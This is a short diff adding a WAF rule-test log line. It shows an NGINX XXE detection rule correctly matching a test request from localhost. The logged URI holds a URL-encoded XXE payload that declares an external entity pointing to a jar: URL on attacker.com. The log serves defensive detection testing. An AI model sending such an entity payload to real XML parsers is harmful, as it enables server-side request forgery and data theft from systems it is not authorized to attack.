@@ -1,0 +1,3 @@
+Expected Rule: [NGINX XXE Attack] DOCTYPE/ENTITY injection
+Matched Rule: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1772115443995-knu0yl pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1
+Rule Match: ✅ Match
